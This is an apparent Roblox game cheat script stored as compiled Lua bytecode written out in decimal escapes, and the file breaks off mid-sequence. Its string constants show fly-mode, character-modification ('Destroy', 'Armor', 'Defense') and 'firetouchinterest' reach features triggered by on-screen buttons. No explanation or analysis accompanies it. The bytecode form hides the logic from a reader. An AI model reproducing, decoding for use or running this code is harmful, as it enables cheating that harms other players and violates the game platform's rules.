70\1\196\0\0\1\198\64\198\1\140\192\0\1\23\192\70\1\22\64\11\128\132\0\128\1\87\192\70\1\22\128\10\128\133\64\7\0\134\128\71\1\134\192\71\1\134\0\72\1\134\64\72\1\196\0\128\2\198\0\198\1\4\1\128\2\6\65\70\2\204\0\129\1\142\192\0\1\197\64\7\0\198\128\199\1\198\192\199\1\198\0\200\1\5\65\2\0\6\65\64\2\68\1\128\2\70\65\197\2\132\1\128\2\134\129\69\3\76\129\129\2\132\1\128\2\134\1\70\3\196\1\128\2\198\65\198\3\140\193\1\3\142\129\72\3\193\1\3\0\28\129\0\2\6\193\72\2\206\0\129\1\5\65\7\0\6\129\71\2\6\193\71\2\6\1\72\2\6\193\72\2\205\0\129\1\140\192\0\1\196\0\128\1\142\192\0\1\73\128\128\133\22\128\1\128\133\128\1\0\134\64\64\1\193\0\3\0\1\65\3\0\65\1\3\0\156\128\0\2\73\128\128\133\133\64\7\0\134\128\71\1\134\192\71\1\134\0\72\1\197\64\2\0\198\0\201\1\5\65\9\0\6\129\73\2\68\1\0\1\70\1\198\2\132\1\0\1\134\65\70\3\76\129\129\2\78\193\201\2\132\1\128\1\78\129\129\2\132\1\0\2\79\129\129\2\28\129\0\1\18\1\0\2\65\1\3\0\129\1\3\0\220\128\0\2\142\192\0\1\9\128\0\132\132\0\0\3\154\64\0\0\22\0\199\127\138\0\1\0\137\0\67\140\137\0\195\140\137\0\195\138\137\0\67\139\136\0\0\1\138\0\1\0\137\0\67\140\137\0\195\140\137\0\195\138\137\0\67\139\136\0\128\2\129\192\6\0\136\0\128\1\139\0\74\0\156\64\0\1\139\0\202\0\156\64\0\1\132\0\128\0\134\0\68\1\139\64\68\1\1\129\4\0\156\128\128\1\137\64\202\137\30\0\128\0\42\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\9\0\0\0\66\111\100\121\71\121\114\111\0\4\2\0\0\0\80\0\3\0\0\0\0\0\249\245\64\4\10\0\0\0\109\97\120\84\111\114\113\117\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\3\0\0\0\208\136\195\0\66\4\7\0\0\0\99\102\114\97\109\101\0\4\7\0\0\0\67\70\114\97\109\101\0\4\13\0\0\0\66\111\100\121\86\101\108\111\99\105\116\121\0\4\9\0\0\0\118\101\108\111\99\105\116\121\0\3\0\0\0\0\0\0\0\0\3\154\153\153\153\153\153\185\63\4\9\0\0\0\109\97\120\70\111\114\99\101\0\4\5\0\0\0\119\97\105\116\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\23\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\87\104\105\99\104\73\115\65\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\14\0\0\0\80\108\97\116\102\111\114\109\83\116\97\110\100\0\1\1\4\2\0\0\0\108\0\4\2\0\0\0\114\0\3\0\0\0\0\0\106\248\64\4\2\0\0\0\102\0\4\2\0\0\0\98\0\3\0\0\0\0\0\136\195\64\3\0\0\0\0\0\0\20\64\3\0\0\0\0\0\0\0\192\4\5\0\0\0\103\97\109\101\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\14\0\0\0\67\117\114\114\101\110\116\67\97\109\101\114\97\0\4\16\0\0\0\67\111\111\114\100\105\110\97\116\101\70\114\97\109\101\0\4\11\0\0\0\108\111\111\107\86\101\99\116\111\114\0\3\154\153\153\153\153\153\201\63\4\2\0\0\0\112\0\4\7\0\0\0\65\110\103\108\101\115\0\4\5\0\0\0\109\97\116\104\0\4\4\0\0\0\114\97\100\0\3\0\0\0\0\0\0\73\64\4\8\0\0\0\68\101\115\116\114\111\121\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\25\6\0\0\41\6\0\0\3\1\0\3\49\0\0\0\75\0\64\0\92\128\0\1\23\64\192\0\22\128\2\128\68\0\0\0\90\0\0\0\22\128\0\128\66\0\0\0\72\0\0\0\22\64\9\128\66\0\128\0\72\0\0\0\68\0\128\0\92\64\128\0\22\0\8\128\75\0\64\0\92\128\0\1\23\128\192\0\22\192\0\128\68\0\0\1\133\0\1\0\73\128\128\129\22\0\6\128\75\0\64\0\92\128\0\1\23\64\193\0\22\0\1\128\68\0\0\1\133\0\1\0\146\0\0\1\73\128\0\131\22\192\3\128\75\0\64\0\92\128\0\1\23\192\193\0\22\0\1\128\68\0\0\1\133\0\1\0\146\0\0\1\73\128\0\132\22\128\1\128\75\0\64\0\92\128\0\1\23\64\194\0\22\128\0\128\68\0\0\1\133\0\1\0\73\128\0\133\30\0\128\0\11\0\0\0\4\6\0\0\0\108\111\119\101\114\0\4\2\0\0\0\120\0\4\2\0\0\0\119\0\4\2\0\0\0\102\0\4\9\0\0\0\70\76\89\83\80\69\69\68\0\4\2\0\0\0\115\0\4\2\0\0\0\98\0\4\2\0\0\0\97\0\4\2\0\0\0\108\0\4\2\0\0\0\100\0\4\2\0\0\0\114\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\42\6\0\0\52\6\0\0\1\1\0\3\28\0\0\0\75\0\64\0\92\128\0\1\23\64\192\0\22\128\0\128\68\0\0\0\73\192\64\129\22\192\4\128\75\0\64\0\92\128\0\1\23\0\193\0\22\128\0\128\68\0\0\0\73\192\192\130\22\0\3\128\75\0\64\0\92\128\0\1\23\128\193\0\22\128\0\128\68\0\0\0\73\192\192\131\22\64\1\128\75\0\64\0\92\128\0\1\23\0\194\0\22\64\0\128\68\0\0\0\73\192\192\132\30\0\128\0\10\0\0\0\4\6\0\0\0\108\111\119\101\114\0\4\2\0\0\0\119\0\4\2\0\0\0\102\0\3\0\0\0\0\0\0\0\0\4\2\0\0\0\115\0\4\2\0\0\0\98\0\4\2\0\0\0\97\0\4\2\0\0\0\108\0\4\2\0\0\0\100\0\4\2\0\0\0\114\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\58\6\0\0\73\6\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\64\6\0\0\72\6\0\0\0\0\0\7\19\0\0\0\5\0\0\0\12\64\64\0\7\0\0\0\5\128\0\0\6\192\64\0\11\0\65\0\129\64\1\0\202\192\0\0\201\192\65\131\1\65\2\0\69\129\2\0\133\1\0\0\92\129\0\1\129\193\2\0\21\129\1\2\201\0\1\132\201\64\64\134\28\64\0\2\30\0\128\0\13\0\0\0\4\9\0\0\0\70\76\89\83\80\69\69\68\0\3\0\0\0\0\0\0\240\63\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\83\116\97\114\116\101\114\71\117\105\0\4\8\0\0\0\83\101\116\67\111\114\101\0\4\17\0\0\0\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\0\4\6\0\0\0\84\105\116\108\101\0\4\1\0\0\0\0\4\5\0\0\0\84\101\120\116\0\4\17\0\0\0\32\91\43\93\32\70\108\121\32\83\112\101\101\100\58\32\0\4\9\0\0\0\116\111\115\116\114\105\110\103\0\4\2\0\0\0\46\0\4\9\0\0\0\68\117\114\97\116\105\111\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\75\6\0\0\101\6\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\81\6\0\0\100\6\0\0\0\0\0\10\73\0\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\6\192\64\0\70\0\65\0\139\64\193\0\1\129\1\0\156\128\128\1\137\0\194\131\133\64\2\0\198\0\65\0\203\128\194\1\220\0\0\1\156\0\1\0\22\192\2\128\203\193\66\3\65\2\3\0\220\129\128\1\218\65\0\0\22\0\1\128\203\193\66\3\65\66\3\0\220\129\128\1\218\1\0\0\22\64\0\128\203\129\67\3\220\65\0\1\161\128\0\0\22\64\252\127\134\192\67\0\139\0\68\1\156\128\0\1\197\64\4\0\198\128\196\1\1\193\4\0\220\128\0\1\201\64\69\138\201\128\0\139\11\193\69\1\129\1\6\0\28\129\128\1\11\129\67\2\28\65\0\1\11\193\69\1\129\65\6\0\28\129\128\1\11\193\69\2\129\129\6\0\28\129\128\1\11\129\67\2\28\65\0\1\5\65\4\0\6\129\68\2\65\193\6\0\128\1\0\1\28\129\128\1\9\1\70\138\69\65\4\0\70\129\196\2\129\1\7\0\197\1\0\0\203\65\192\3\65\130\0\0\220\129\128\1\198\193\192\3\198\1\193\3\203\65\199\3\65\66\6\0\220\1\128\1\92\129\0\0\73\129\70\138\30\0\128\0\30\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\23\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\87\104\105\99\104\73\115\65\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\7\0\0\0\72\101\97\108\116\104\0\3\0\0\0\0\0\0\0\0\4\6\0\0\0\112\97\105\114\115\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\4\0\0\0\73\115\65\0\4\9\0\0\0\77\101\115\104\80\97\114\116\0\4\10\0\0\0\65\99\99\101\115\115\111\114\121\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\15\0\0\0\67\104\97\114\97\99\116\101\114\65\100\100\101\100\0\4\5\0\0\0\87\97\105\116\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\7\0\0\0\70\111\108\100\101\114\0\4\5\0\0\0\78\97\109\101\0\4\18\0\0\0\70\85\76\76\89\95\76\79\65\68\69\68\95\67\72\65\82\0\4\7\0\0\0\80\97\114\101\110\116\0\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\19\0\0\0\82\97\103\100\111\108\108\67\111\110\115\116\114\97\105\110\116\115\0\4\12\0\0\0\66\111\100\121\69\102\102\101\99\116\115\0\4\8\0\0\0\68\101\102\101\110\115\101\0\4\10\0\0\0\66\111\111\108\86\97\108\117\101\0\4\9\0\0\0\73\110\116\86\97\108\117\101\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\103\6\0\0\129\6\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\109\6\0\0\128\6\0\0\0\0\0\10\73\0\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\6\192\64\0\70\0\65\0\139\64\193\0\1\129\1\0\156\128\128\1\137\0\194\131\133\64\2\0\198\0\65\0\203\128\194\1\220\0\0\1\156\0\1\0\22\192\2\128\203\193\66\3\65\2\3\0\220\129\128\1\218\65\0\0\22\0\1\128\203\193\66\3\65\66\3\0\220\129\128\1\218\1\0\0\22\64\0\128\203\129\67\3\220\65\0\1\161\128\0\0\22\64\252\127\134\192\67\0\139\0\68\1\156\128\0\1\197\64\4\0\198\128\196\1\1\193\4\0\220\128\0\1\201\64\69\138\201\128\0\139\11\193\69\1\129\1\6\0\28\129\128\1\11\129\67\2\28\65\0\1\11\193\69\1\129\65\6\0\28\129\128\1\11\193\69\2\129\129\6\0\28\129\128\1\11\129\67\2\28\65\0\1\5\65\4\0\6\129\68\2\65\193\6\0\128\1\0\1\28\129\128\1\9\1\70\138\69\65\4\0\70\129\196\2\129\1\7\0\197\1\0\0\203\65\192\3\65\130\0\0\220\129\128\1\198\193\192\3\198\1\193\3\203\65\199\3\65\66\6\0\220\1\128\1\92\129\0\0\73\129\70\138\30\0\128\0\30\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\23\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\87\104\105\99\104\73\115\65\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\7\0\0\0\72\101\97\108\116\104\0\3\0\0\0\0\0\0\0\0\4\6\0\0\0\112\97\105\114\115\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\4\0\0\0\73\115\65\0\4\9\0\0\0\77\101\115\104\80\97\114\116\0\4\10\0\0\0\65\99\99\101\115\115\111\114\121\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\15\0\0\0\67\104\97\114\97\99\116\101\114\65\100\100\101\100\0\4\5\0\0\0\87\97\105\116\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\7\0\0\0\70\111\108\100\101\114\0\4\5\0\0\0\78\97\109\101\0\4\18\0\0\0\70\85\76\76\89\95\76\79\65\68\69\68\95\67\72\65\82\0\4\7\0\0\0\80\97\114\101\110\116\0\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\19\0\0\0\82\97\103\100\111\108\108\67\111\110\115\116\114\97\105\110\116\115\0\4\12\0\0\0\66\111\100\121\69\102\102\101\99\116\115\0\4\6\0\0\0\65\114\109\111\114\0\4\10\0\0\0\66\111\111\108\86\97\108\117\101\0\4\9\0\0\0\73\110\116\86\97\108\117\101\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\131\6\0\0\174\6\0\0\1\0\0\6\16\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\133\0\1\0\134\64\65\1\134\128\65\1\198\192\193\0\203\0\194\1\100\1\0\0\0\0\128\0\0\0\0\1\220\64\128\1\30\0\128\0\9\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\137\6\0\0\173\6\0\0\2\0\0\5\27\0\0\0\4\0\0\0\6\0\64\0\23\64\64\0\22\0\3\128\4\0\0\0\9\128\64\128\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\11\128\65\0\129\64\0\0\193\192\1\0\36\1\0\0\4\0\128\0\28\64\128\2\22\0\2\128\4\0\0\0\9\64\64\128\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\11\0\66\0\129\64\0\0\28\64\128\1\30\0\128\0\9\0\0\0\4\5\0\0\0\84\101\120\116\0\4\6\0\0\0\82\101\97\99\104\0\4\8\0\0\0\85\110\82\101\97\99\104\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\17\0\0\0\66\105\110\100\84\111\82\101\110\100\101\114\83\116\101\112\0\3\0\0\0\0\0\0\0\0\4\21\0\0\0\85\110\98\105\110\100\70\114\111\109\82\101\110\100\101\114\83\116\101\112\0\1\0\0\0\0\0\0\0\144\6\0\0\166\6\0\0\1\0\0\2\7\0\0\0\5\0\0\0\28\64\128\0\5\64\0\0\100\0\0\0\4\0\0\0\28\192\0\1\30\0\128\0\2\0\0\0\4\5\0\0\0\119\97\105\116\0\4\6\0\0\0\112\99\97\108\108\0\1\0\0\0\0\0\0\0\146\6\0\0\165\6\0\0\1\0\0\9\125\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\6\128\64\0\6\192\64\0\23\0\65\0\22\0\29\128\5\64\1\0\69\128\1\0\75\192\193\0\193\0\2\0\92\128\128\1\75\64\194\0\92\0\0\1\28\0\1\0\22\64\26\128\70\1\64\2\70\129\194\2\70\193\194\2\132\1\0\0\134\1\64\3\134\1\67\3\134\193\66\3\77\129\129\2\70\65\195\2\25\128\195\2\22\128\23\128\69\129\1\0\70\1\194\2\70\193\195\2\70\1\192\2\75\1\196\2\193\65\4\0\92\129\128\1\90\1\0\0\22\64\21\128\69\129\1\0\70\1\194\2\70\193\195\2\70\1\192\2\75\1\196\2\193\65\4\0\92\129\128\1\75\129\196\2\193\193\4\0\92\129\128\1\90\1\0\0\22\64\3\128\69\1\5\0\133\129\1\0\134\1\66\3\134\193\67\3\134\1\64\3\139\1\68\3\1\66\4\0\156\129\128\1\134\193\68\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\22\192\14\128\69\1\5\0\133\129\1\0\134\1\66\3\134\193\67\3\134\1\64\3\134\193\69\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\69\1\5\0\133\129\1\0\134\1\66\3\134\193\67\3\134\1\64\3\134\1\67\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\69\1\5\0\133\129\1\0\134\1\66\3\134\193\67\3\134\1\64\3\134\1\70\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\69\1\5\0\133\129\1\0\134\1\66\3\134\193\67\3\134\1\64\3\134\65\70\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\69\1\5\0\133\129\1\0\134\1\66\3\134\193\67\3\134\1\64\3\134\129\70\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\69\1\5\0\133\129\1\0\134\1\66\3\134\193\67\3\134\1\64\3\134\193\70\3\198\1\64\2\198\65\197\3\1\130\5\0\92\65\0\2\33\128\0\0\22\192\228\127\30\0\128\0\28\0\0\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\12\0\0\0\66\111\100\121\69\102\102\101\99\116\115\0\4\10\0\0\0\65\116\116\97\99\107\105\110\103\0\4\6\0\0\0\86\97\108\117\101\0\1\1\4\6\0\0\0\112\97\105\114\115\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\9\0\0\0\76\101\102\116\72\97\110\100\0\4\10\0\0\0\77\97\103\110\105\116\117\100\101\0\3\0\0\0\0\0\0\73\64\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\22\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\0\4\5\0\0\0\84\111\111\108\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\7\0\0\0\72\97\110\100\108\101\0\4\18\0\0\0\102\105\114\101\116\111\117\99\104\105\110\116\101\114\101\115\116\0\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\3\0\0\0\0\0\0\0\0\4\10\0\0\0\82\105\103\104\116\72\97\110\100\0\4\10\0\0\0\82\105\103\104\116\70\111\111\116\0\4\9\0\0\0\76\101\102\116\70\111\111\116\0\4\14\0\0\0\82\105\103\104\116\76\111\119\101\114\76\101\103\0\4\13\0\0\0\76\101\102\116\76\111\119\101\114\76\101\103\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\176\6\0\0\243\6\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\182\6\0\0\241\6\0\0\0\0\0\14\34\0\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\6\192\64\0\70\0\65\0\139\64\65\0\156\128\0\1\194\0\0\0\6\129\193\0\70\193\193\0\133\1\0\0\139\65\64\3\1\2\2\0\156\129\128\1\228\1\0\0\0\0\0\2\0\0\0\1\0\0\128\2\3\2\0\4\100\66\0\0\0\0\0\4\0\0\128\3\164\130\0\0\0\0\0\4\198\66\66\3\203\130\194\5\100\195\0\0\0\0\128\1\0\0\128\4\0\0\128\0\0\0\0\5\220\66\128\1\30\0\128\0\11\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\71\101\116\77\111\117\115\101\0\4\9\0\0\0\76\101\102\116\72\97\110\100\0\4\10\0\0\0\82\105\103\104\116\72\97\110\100\0\4\17\0\0\0\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101\0\4\11\0\0\0\73\110\112\117\116\66\101\103\97\110\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\0\0\0\0\0\0\0\195\6\0\0\198\6\0\0\3\0\0\3\17\0\0\0\4\0\0\0\69\0\0\0\70\64\192\0\132\0\128\0\134\128\64\1\134\192\64\1\92\128\0\1\9\64\0\128\4\0\0\1\69\0\0\0\70\64\192\0\132\0\128\0\134\128\64\1\134\192\64\1\92\128\0\1\9\64\0\128\30\0\128\0\4\0\0\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\4\4\0\0\0\72\105\116\0\4\2\0\0\0\112\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\202\6\0\0\204\6\0\0\2\0\0\3\10\0\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\6\192\64\0\11\0\65\0\132\0\128\0\28\128\128\1\8\0\0\0\30\0\128\0\5\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\10\0\0\0\72\101\97\114\116\98\101\97\116\0\4\8\0\0\0\67\111\110\110\101\99\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\206\6\0\0\208\6\0\0\1\0\0\2\4\0\0\0\4\0\0\0\11\0\64\0\28\64\0\1\30\0\128\0\1\0\0\0\4\11\0\0\0\68\105\115\99\111\110\110\101\99\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\211\6\0\0\240\6\0\0\4\1\0\16\118\0\0\0\70\0\64\0\133\64\0\0\134\0\64\1\134\128\64\1\23\128\128\0\22\128\27\128\68\0\0\0\23\192\192\0\22\0\2\128\66\0\128\0\72\0\0\0\68\0\128\0\92\64\128\0\69\0\1\0\164\0\0\0\4\0\0\1\92\64\0\1\22\128\24\128\68\0\0\0\23\64\193\0\22\192\23\128\66\0\0\0\72\0\0\0\68\0\128\1\92\64\128\0\69\128\1\0\70\192\193\0\129\0\2\0\92\128\0\1\73\128\194\132\132\0\0\1\134\0\67\1\73\128\128\133\133\128\3\0\134\192\65\1\193\192\3\0\1\1\4\0\65\65\4\0\129\129\4\0\193\193\4\0\1\194\4\0\65\194\4\0\129\130\4\0\193\194\4\0\1\195\4\0\65\195\4\0\129\131\4\0\156\128\128\6\73\128\128\134\133\128\3\0\134\192\65\1\193\64\5\0\1\129\5\0\65\193\5\0\129\129\4\0\193\193\4\0\1\194\4\0\65\194\4\0\129\130\4\0\193\194\4\0\1\195\4\0\65\195\4\0\129\131\4\0\156\128\128\6\73\128\0\138\132\0\0\1\134\64\70\1\73\128\0\140\132\0\0\1\134\0\67\1\73\128\0\141\133\128\1\0\134\192\65\1\193\0\2\0\156\128\0\1\137\192\198\132\196\0\0\1\198\0\199\1\137\192\128\133\197\128\3\0\198\192\193\1\1\65\7\0\65\1\4\0\129\129\7\0\193\129\4\0\1\194\4\0\65\194\4\0\129\194\4\0\193\130\4\0\1\195\4\0\65\195\4\0\129\195\4\0\193\131\4\0\220\128\128\6\137\192\128\134\197\128\3\0\198\192\193\1\1\193\7\0\65\129\5\0\129\193\5\0\193\129\4\0\1\194\4\0\65\194\4\0\129\194\4\0\193\130\4\0\1\195\4\0\65\195\4\0\129\195\4\0\193\131\4\0\220\128\128\6\137\192\0\138\196\0\0\1\198\0\200\1\137\192\0\140\196\0\0\1\198\0\199\1\137\192\0\141\30\0\128\0\33\0\0\0\4\8\0\0\0\75\101\121\67\111\100\101\0\4\5\0\0\0\69\110\117\109\0\4\2\0\0\0\81\0\1\0\4\6\0\0\0\112\99\97\108\108\0\1\1\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\8\0\0\0\77\111\116\111\114\54\68\0\4\5\0\0\0\78\97\109\101\0\4\11\0\0\0\82\105\103\104\116\87\114\105\115\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\10\0\0\0\82\105\103\104\116\72\97\110\100\0\4\3\0\0\0\67\48\0\4\7\0\0\0\67\70\114\97\109\101\0\3\87\213\228\193\238\201\127\62\3\230\22\4\160\155\7\224\191\3\26\254\223\191\70\112\95\188\3\0\0\0\0\0\0\240\63\3\0\0\0\0\0\0\0\0\4\3\0\0\0\67\49\0\3\93\43\136\0\115\215\151\62\3\73\249\88\224\124\1\192\63\3\46\170\23\192\238\201\111\62\4\6\0\0\0\80\97\114\116\48\0\4\14\0\0\0\82\105\103\104\116\76\111\119\101\114\65\114\109\0\4\6\0\0\0\80\97\114\116\49\0\4\10\0\0\0\76\101\102\116\87\114\105\115\116\0\4\9\0\0\0\76\101\102\116\72\97\110\100\0\3\13\128\59\128\0\41\63\63\3\187\111\250\63\254\105\246\59\3\232\121\186\95\246\46\63\63\4\13\0\0\0\76\101\102\116\76\111\119\101\114\65\114\109\0\1\0\0\0\0\0\0\0\216\6\0\0\219\6\0\0\1\0\0\2\11\0\0\0\4\0\0\0\6\0\64\0\6\64\64\0\11\128\64\0\28\64\0\1\4\0\0\0\6\192\64\0\6\0\65\0\11\128\64\0\28\64\0\1\30\0\128\0\5\0\0\0\4\10\0\0\0\82\105\103\104\116\72\97\110\100\0\4\11\0\0\0\82\105\103\104\116\87\114\105\115\116\0\4\7\0\0\0\82\101\109\111\118\101\0\4\9\0\0\0\76\101\102\116\72\97\110\100\0\4\10\0\0\0\76\101\102\116\87\114\105\115\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\245\6\0\0\9\7\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\250\6\0\0\8\7\0\